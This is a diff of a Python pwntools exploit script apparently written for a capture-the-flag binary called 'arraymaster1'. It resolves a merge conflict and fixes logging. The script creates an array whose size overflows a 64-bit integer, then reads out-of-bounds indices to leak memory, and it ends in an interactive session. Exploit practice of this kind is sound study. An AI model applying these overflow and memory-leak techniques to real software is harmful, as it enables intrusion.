@@ -2,7 +2,7 @@ from pwn import *
 
 p=process('./arraymaster1')
 e=ELF('./arraymaster1')
-pause()
+# pause()
 
 def list_info(p):
     p.recvuntil('\n> ')
@@ -23,32 +23,29 @@ def delete(p,a):
 def set_(p,a,b,c):
     p.recvuntil('\n> ')
     p.sendline('set {} {} {}'.format(a,b,c))
-    log.info('[SET VALUE] ARR<{}> index<{}> val<{}>')
+    log.info('[SET VALUE] ARR<{}> index<{}> val<{}>'.format(a,b,c))
 
 def get(p,a,b):
     p.recvuntil('\n> ')
     p.sendline('get {} {}'.format(a,b))
-    log.info('[GET DATA] ARR<{}> index<{}>')
+    log.info('[GET DATA] ARR<{}> index<{}>'.format(a,b))
     return p.recvline()
 
 def quit(p):
     p.recvuntil('\n> ')
     p.sendline('quit')
-<<<<<<< HEAD
-init(p,'A',64,0xffffffffffffffff+1/8)
-=======
 
 
 init(p,'A',64,(0xffffffffffffffff+1)/8)
 init(p,'B',64,10)
+init(p,'C',64,10)
 #for i in range(1):
-set_(p,'A',1,123)
-set_(p,'B',1,456)
-for i in range(20):
- print '[idx]: {}'.format(i)
- log.info('[LEAKED]: '+hex(int(get(p,'B',i),16)))
+set_(p,'A',0,123)
+set_(p,'B',0,456)
+set_(p,'C',0,789)
+for i in range(30):
+ log.info('[LEAKED]: '+hex(int(get(p,'A',i),16)))
  sleep(0.2)
->>>>>>> e9cffcd3dd047fe1ed13bf2baf3acd2805222de8
 
 p.interactive()
              
